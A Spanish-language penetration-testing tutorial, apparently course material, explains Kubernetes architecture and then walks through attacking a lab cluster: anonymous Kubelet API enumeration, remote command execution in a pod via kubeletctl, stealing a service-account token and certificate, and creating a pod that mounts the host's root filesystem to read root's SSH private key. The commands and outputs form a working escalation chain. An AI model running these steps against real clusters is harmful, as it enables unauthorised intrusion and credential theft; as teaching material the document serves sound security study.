[Kubernetes](https://kubernetes.io/), también conocido como `K8s`, destaca como una tecnología revolucionaria que ha tenido un impacto significativo en el panorama del desarrollo de software. Esta plataforma ha transformado completamente el proceso de despliegue y gestión de aplicaciones, proporcionando un enfoque más eficiente y optimizado. Ofreciendo una arquitectura de código abierto, Kubernetes ha sido diseñado específicamente para facilitar el despliegue, escalado y gestión de contenedores de aplicaciones de manera más rápida y sencilla.

Desarrollado por Google, Kubernetes aprovecha más de una década de experiencia en la ejecución de cargas de trabajo complejas. Como resultado, se ha convertido en una herramienta crítica en el universo DevOps para la orquestación de microservicios. Desde su creación, Kubernetes ha sido donado a la [Cloud Native Computing Foundation](https://www.cncf.io/), donde se ha convertido en el estándar de oro de la industria. Entender los aspectos de seguridad de los contenedores K8s es crucial. Probablemente podremos acceder a uno de los muchos contenedores durante nuestra prueba de penetración.

Una de las características clave de Kubernetes es su adaptabilidad y compatibilidad con varios entornos. Esta plataforma ofrece una amplia gama de características que permiten a los desarrolladores y administradores de sistemas configurar, automatizar y escalar sus despliegues y aplicaciones con facilidad. Como resultado, Kubernetes se ha convertido en una solución preferida para las organizaciones que buscan optimizar sus procesos de desarrollo y mejorar la eficiencia.

Kubernetes es un sistema de orquestación de contenedores, que funciona ejecutando todas las aplicaciones en contenedores aislados del sistema host a través de `multiple layers of protection` (múltiples capas de protección). Este enfoque garantiza que las aplicaciones no se vean afectadas por cambios en el sistema host, como actualizaciones o parches de seguridad. La arquitectura de K8s comprende un `master node` (nodo maestro) y `worker nodes` (nodos de trabajo), cada uno con roles específicos.

---

## K8s Concept

Kubernetes gira en torno al concepto de pods, que pueden contener uno o más contenedores estrechamente conectados. Cada pod funciona como una máquina virtual separada en un nodo, con su propia IP, hostname y otros detalles. Kubernetes simplifica la gestión de múltiples contenedores ofreciendo herramientas para balanceo de carga, descubrimiento de servicios, orquestación de almacenamiento, auto-recuperación y más. A pesar de los desafíos en seguridad y gestión, K8s sigue creciendo y mejorando con características como `Role-Based Access Control` (RBAC), `Network Policies` y `Security Contexts`, proporcionando un entorno más seguro para las aplicaciones.

### Diferencias entre K8 y Docker

| **Función** | **Docker** | **Kubernetes** |
| --- | --- | --- |
| `Primary` | Plataforma para contenerizar aplicaciones | Herramienta de orquestación para gestionar contenedores |
| `Scaling` | Escalado manual con Docker swarm | Escalado automático |
| `Networking` | Red única | Red compleja con políticas |
| `Storage` | Volúmenes | Amplia gama de opciones de almacenamiento |

La arquitectura de Kubernetes se divide principalmente en dos tipos de componentes:

- `The Control Plane` (nodo maestro), que es responsable de controlar el clúster de Kubernetes
- `The Worker Nodes` (minions), donde se ejecutan las aplicaciones contenerizadas

### Nodes

El nodo maestro aloja el `Control Plane` de Kubernetes, que gestiona y coordina todas las actividades dentro del clúster y asegura que el estado deseado del clúster se mantenga. Por otro lado, los `Minions` ejecutan las aplicaciones reales y reciben instrucciones del Control Plane para asegurar que el estado deseado se logre.

Kubernetes cubre la versatilidad al acomodar diversas necesidades, como soportar bases de datos, cargas de trabajo de AI/ML, y microservicios nativos en la nube. Además, es capaz de gestionar aplicaciones de alto recurso en el borde y es compatible con diferentes plataformas. Por lo tanto, se puede utilizar en servicios de nube pública como Google Cloud, Azure y AWS, o dentro de centros de datos privados en las instalaciones.

### Control Plane

El Control Plane sirve como la capa de gestión. Consiste en varios componentes cruciales, incluyendo:

| **Service** | **TCP Ports** |
| --- | --- |
| `etcd` | `2379`, `2380` |
| `API server` | `6443` |
| `Scheduler` | `10251` |
| `Controller Manager` | `10252` |
| `Kubelet API` | `10250` |
| `Read-Only Kubelet API` | `10255` |

Estos elementos permiten que el `Control Plane` tome decisiones y proporcione una vista integral de todo el clúster.

### Minions

Dentro de un entorno contenerizado, los `Minions` (nodos de trabajo) sirven como la ubicación designada para ejecutar aplicaciones. Es importante notar que cada nodo es gestionado y regulado por el Control Plane, lo que ayuda a asegurar que todos los procesos que se ejecutan dentro de los contenedores operen de manera fluida y eficiente.

El `Scheduler`, basado en el `API server`, entiende el estado del clúster y programa nuevos pods en los nodos en consecuencia. Después de decidir en qué nodo debe ejecutarse un pod, el API server actualiza el `etcd`.

Entender cómo interactúan estos componentes es esencial para comprender el funcionamiento de Kubernetes. El API server es el punto de entrada para todos los comandos administrativos, ya sea de los usuarios a través de kubectl o de los controladores. Este servidor se comunica con etcd para obtener o actualizar el estado del clúster.

### Medidas de Seguridad de K8s

La seguridad de Kubernetes puede dividirse en varios dominios:

- Seguridad de la infraestructura del clúster
- Seguridad de la configuración del clúster
- Seguridad de la aplicación
- Seguridad de los datos

Cada dominio incluye múltiples capas y elementos que deben ser asegurados y gestionados adecuadamente por los desarrolladores y administradores.

---

## Kubernetes API

El núcleo de la arquitectura de Kubernetes es su API, que sirve como el principal punto de contacto para todas las interacciones internas y externas. La API de Kubernetes ha sido diseñada para soportar el control declarativo, permitiendo a los usuarios definir su estado deseado para el sistema. Esto permite que Kubernetes tome las medidas necesarias para implementar el estado deseado. El kube-apiserver es responsable de alojar la API, que maneja y verifica las solicitudes RESTful para modificar el estado del sistema. Estas solicitudes pueden implicar la creación, modificación, eliminación y recuperación de información relacionada con varios recursos dentro del sistema. En general, la API de Kubernetes juega un papel crucial en facilitar la comunicación y el control sin problemas dentro del clúster de Kubernetes.

Dentro del framework de Kubernetes, un recurso API sirve como un punto final que alberga una colección específica de objetos API. Estos objetos pertenecen a una categoría particular e incluyen elementos esenciales como Pods, Services y Deployments, entre otros. Cada recurso único viene equipado con un conjunto distinto de operaciones que se pueden ejecutar, incluyendo pero no limitado a:

| **Request** | **Description** |
| --- | --- |
| `GET` | Recupera información sobre un recurso o una lista de recursos. |
| `POST` | Crea un nuevo recurso. |
| `PUT` | Actualiza un recurso existente. |
| `PATCH` | Aplica actualizaciones parciales a un recurso. |
| `DELETE` | Elimina un recurso. |

### Authentication

En términos de autenticación, Kubernetes soporta varios métodos como certificados de cliente, tokens de portador, un proxy autenticador, o HTTP basic auth, que sirven para verificar la identidad del usuario. Una vez que el usuario ha sido autenticado, Kubernetes aplica decisiones de autorización usando `Role-Based Access Control` (RBAC). Esta técnica implica asignar roles específicos a usuarios o procesos con permisos correspondientes para acceder y operar sobre recursos. Por lo tanto, el proceso de autenticación y autorización de Kubernetes es una medida de seguridad integral que asegura que solo los usuarios autorizados puedan acceder a los recursos y realizar operaciones.

En Kubernetes, el `Kubelet` puede configurarse para permitir el `anonymous access` (acceso anónimo). Por defecto, el Kubelet permite el acceso anónimo. Las solicitudes anónimas se consideran no autenticadas, lo que implica que cualquier solicitud hecha al Kubelet sin un certificado de cliente válido será tratada como anónima. Esto puede ser problemático, ya que cualquier proceso o usuario que pueda alcanzar la API del Kubelet puede hacer solicitudes y recibir respuestas, potencialmente exponiendo información sensible o llevando a acciones no autorizadas.

### Interacción con el API Server de K8s



```r
cry0l1t3@k8:~$ curl https://10.129.10.11:6443 -k

{
	"kind": "Status",
	"apiVersion": "v1",
	"metadata": {},
	"status": "Failure",
	"message": "forbidden: User \"system:anonymous\" cannot get path \"/\"",
	"reason": "Forbidden",
	"details": {},
	"code": 403
}
```

`System:anonymous` típicamente representa a un usuario no autenticado, lo que significa que no hemos proporcionado credenciales válidas o estamos tratando de acceder al API server de manera anónima. En este caso, intentamos acceder a la ruta raíz, lo que otorgaría un control significativo sobre el clúster de Kubernetes si tuviera éxito. Por defecto, el acceso a la ruta raíz generalmente está restringido a usuarios autenticados y autorizados con privilegios administrativos y el API server negó la solicitud, respondiendo con un código de estado `403 Forbidden` en consecuencia.

### Kubelet API - Extrayendo Pods



```r
cry0l1t3@k8:~$ curl https://10.129.10.11:10250/pods -k | jq .

...SNIP...
{
  "kind": "PodList",
  "apiVersion": "v1",
  "metadata": {},
  "items": [
    {
      "metadata": {
        "name": "nginx",
        "namespace": "default",
        "uid": "aadedfce-4243-47c6-ad5c-faa5d7e00c0c",
        "resourceVersion": "491",
        "creationTimestamp": "2023-07-04T10:42:02Z",
        "annotations": {
          "kubectl.kubernetes.io/last-applied-configuration": "{\"apiVersion\":\"v1\",\"kind\":\"Pod\",\"metadata\":{\"annotations\":{},\"name\":\"nginx\",\"namespace\":\"default\"},\"spec\":{\"containers\":[{\"image\":\"nginx:1.14.2\",\"imagePullPolicy\":\"Never\",\"name\":\"nginx\",\"ports\":[{\"containerPort\":80}]}]}}\n",
          "kubernetes.io/config.seen": "2023-07-04T06:42:02.263953266-04:00",
          "kubernetes.io/config.source": "api"
        },
        "managedFields": [
          {
            "manager": "kubectl-client-side-apply",
            "operation": "Update",
            "apiVersion": "v1",
            "time": "2023-07-04T10:42:02Z",
            "fieldsType": "FieldsV1",
            "fieldsV1": {
              "f:metadata": {
                "f:annotations": {
                  ".": {},
                  "f:kubectl.kubernetes.io/last-applied-configuration": {}
                }
              },
              "f:spec": {
                "f:containers": {
                  "k:{\"name\":\"nginx\"}": {
                    ".": {},
                    "f:image": {},
                    "f:imagePullPolicy": {},
                    "f:name": {},
                    "f:ports": {
					...SNIP...
```

La información mostrada en la salida incluye los `names` (nombres), `namespaces` (espacios de nombres), `creation timestamps` (marcas de tiempo de creación) e

 `container images` (imágenes de contenedor) de los pods. También muestra la `last applied configuration` (última configuración aplicada) para cada pod, que podría contener detalles confidenciales sobre las imágenes de los contenedores y sus políticas de extracción.

Entender las imágenes de contenedores y sus versiones utilizadas en el clúster puede permitirnos identificar vulnerabilidades conocidas y explotarlas para obtener acceso no autorizado al sistema. La información de namespace puede proporcionar información sobre cómo se organizan los pods y recursos dentro del clúster, lo cual podemos usar para apuntar a namespaces específicos con vulnerabilidades conocidas. También podemos usar metadatos como `uid` y `resourceVersion` para realizar reconocimiento y reconocer posibles objetivos para ataques adicionales. Divulgar la última configuración aplicada puede potencialmente exponer información sensible, como contraseñas, secretos o tokens API, utilizados durante el despliegue de los pods.

Podemos analizar más a fondo los pods con el siguiente comando:

### Kubeletctl - Extrayendo Pods



```r
cry0l1t3@k8:~$ kubeletctl -i --server 10.129.10.11 pods

┌────────────────────────────────────────────────────────────────────────────────┐
│                                Pods from Kubelet                               │
├───┬────────────────────────────────────┬─────────────┬─────────────────────────┤
│   │ POD                                │ NAMESPACE   │ CONTAINERS              │
├───┼────────────────────────────────────┼─────────────┼─────────────────────────┤
│ 1 │ coredns-78fcd69978-zbwf9           │ kube-system │ coredns                 │
│   │                                    │             │                         │
├───┼────────────────────────────────────┼─────────────┼─────────────────────────┤
│ 2 │ nginx                              │ default     │ nginx                   │
│   │                                    │             │                         │
├───┼────────────────────────────────────┼─────────────┼─────────────────────────┤
│ 3 │ etcd-steamcloud                    │ kube-system │ etcd                    │
│   │                                    │             │                         │
├───┼────────────────────────────────────┼─────────────┼─────────────────────────┤
```

Para interactuar de manera efectiva con los pods dentro del entorno de Kubernetes, es importante tener una comprensión clara de los comandos disponibles. Un enfoque que puede ser particularmente útil es utilizar el comando `scan rce` en `kubeletctl`. Este comando proporciona información valiosa y permite una gestión eficiente de los pods.

### Kubelet API - Comandos Disponibles



```r
cry0l1t3@k8:~$ kubeletctl -i --server 10.129.10.11 scan rce

┌─────────────────────────────────────────────────────────────────────────────────────────────────────┐
│                                   Node with pods vulnerable to RCE                                  │
├───┬──────────────┬────────────────────────────────────┬─────────────┬─────────────────────────┬─────┤
│   │ NODE IP      │ PODS                               │ NAMESPACE   │ CONTAINERS              │ RCE │
├───┼──────────────┼────────────────────────────────────┼─────────────┼─────────────────────────┼─────┤
│   │              │                                    │             │                         │ RUN │
├───┼──────────────┼────────────────────────────────────┼─────────────┼─────────────────────────┼─────┤
│ 1 │ 10.129.10.11 │ nginx                              │ default     │ nginx                   │ +   │
├───┼──────────────┼────────────────────────────────────┼─────────────┼─────────────────────────┼─────┤
│ 2 │              │ etcd-steamcloud                    │ kube-system │ etcd                    │ -   │
├───┼──────────────┼────────────────────────────────────┼─────────────┼─────────────────────────┼─────┤
```

También es posible que interactuemos con un contenedor de manera interactiva y obtengamos información sobre el alcance de nuestros privilegios dentro de él. Esto nos permite entender mejor nuestro nivel de acceso y control sobre el contenido del contenedor.

### Kubelet API - Ejecutando Comandos



```r
cry0l1t3@k8:~$ kubeletctl -i --server 10.129.10.11 exec "id" -p nginx -c nginx

uid=0(root) gid=0(root) groups=0(root)
```

La salida del comando muestra que el usuario actual que ejecuta el comando `id` dentro del contenedor tiene privilegios de root. Esto indica que hemos obtenido acceso administrativo dentro del contenedor, lo que podría llevar potencialmente a vulnerabilidades de escalada de privilegios. Si obtenemos acceso a un contenedor con privilegios de root, podemos realizar acciones adicionales en el sistema host u otros contenedores.

---

## Privilege Escalation

Para obtener mayores privilegios y acceder al sistema host, podemos utilizar una herramienta llamada [kubeletctl](https://github.com/cyberark/kubeletctl) para obtener el `token` y el `certificate` (`ca.crt`) de la cuenta de servicio de Kubernetes desde el servidor. Para hacer esto, debemos proporcionar la dirección IP del servidor, namespace y pod objetivo. En caso de que obtengamos este token y certificado, podemos elevar aún más nuestros privilegios, movernos horizontalmente a través del clúster, o ganar acceso a pods y recursos adicionales.

### Kubelet API - Extrayendo Tokens



```r
cry0l1t3@k8:~$ kubeletctl -i --server 10.129.10.11 exec "cat /var/run/secrets/kubernetes.io/serviceaccount/token" -p nginx -c nginx | tee -a k8.token

eyJhbGciOiJSUzI1NiIsImtpZC...SNIP...UfT3OKQH6Sdw
```

### Kubelet API - Extrayendo Certificados



```r
cry0l1t3@k8:~$ kubeletctl --server 10.129.10.11 exec "cat /var/run/secrets/kubernetes.io/serviceaccount/ca.crt" -p nginx -c nginx | tee -a ca.crt

-----BEGIN CERTIFICATE-----
MIIDBjCCAe6gAwIBAgIBATANBgkqhkiG9w0BAQsFADAVMRMwEQYDVQQDEwptaW5p
<SNIP>
MhxgN4lKI0zpxFBTpIwJ3iZemSfh3pY2UqX03ju4TreksGMkX/hZ2NyIMrKDpolD
602eXnhZAL3+dA==
-----END CERTIFICATE-----
```

Ahora que tenemos tanto el `token` como el `certificate`, podemos verificar los derechos de acceso en el clúster de Kubernetes. Esto se usa comúnmente para auditoría y verificación para garantizar que los usuarios tengan el nivel correcto de acceso y no se les otorguen más privilegios de los necesarios. Sin embargo, podemos usarlo para nuestros propósitos y podemos preguntar a K8s si tenemos permiso para realizar diferentes acciones en varios recursos.

### List Privileges



```r
cry0l1t3@k8:~$ export token=`cat k8.token`
cry0l1t3@k8:~$ kubectl --token=$token --certificate-authority=ca.crt --server=https://10.129.10.11:6443 auth can-i --list

Resources										Non-Resource URLs	Resource Names	Verbs 
selfsubjectaccessreviews.authorization.k8s.io		[]					[]				[create]
selfsubjectrulesreviews.authorization.k8s.io		[]					[]				[create]
pods											[]					[]				[get create list]
...SNIP...
```

Aquí podemos ver algunas informaciones muy importantes. Además de los selfsubject-resources, podemos `get` (obtener), `create` (crear), y `list` (listar) pods, que son los recursos que representan el contenedor en ejecución en el clúster. A partir de aquí, podemos crear un archivo `YAML` que podemos usar para crear un nuevo contenedor y montar todo el sistema de archivos raíz del sistema host en el directorio `/root` de este contenedor. Desde allí, podríamos acceder a los archivos y directorios del sistema host. El archivo `YAML` podría parecerse a lo siguiente:

### Pod YAML



```r
apiVersion: v1
kind: Pod
metadata:
  name: privesc
  namespace: default
spec:
  containers:
  - name: privesc
    image: nginx:1.14.2
    volumeMounts:
    - mountPath: /root
      name: mount-root-into-mnt
  volumes:
  - name: mount-root-into-mnt
    hostPath:
       path: /
  automountServiceAccountToken: true
  hostNetwork: true
```

Una vez creado, ahora podemos crear el nuevo pod y verificar si está funcionando como se esperaba.

### Creando un nuevo Pod



```r
cry0l1t3@k8:~$ kubectl --token=$token --certificate-authority=ca.crt --server=https://10.129.96.98:6443 apply -f privesc.yaml

pod/privesc created


cry0l1t3@k8:~$ kubectl --token=$token --certificate-authority=ca.crt --server=https://10.129.96.98:6443 get pods

NAME	READY	STATUS	RESTARTS	AGE
nginx	1/1		Running	0			23m
privesc	1/1		Running	0			12s
```

Si el pod está funcionando, podemos ejecutar el comando y podríamos generar un reverse shell o recuperar datos sensibles como la clave SSH del usuario root.

### Extrayendo la clave SSH del Root



```r
cry0l1t3@k8:~$ kubeletctl --server 10.129.10.11 exec "cat /root/root/.ssh/id_rsa" -p privesc -c privesc

-----BEGIN OPENSSH PRIVATE KEY-----
...SNIP...
```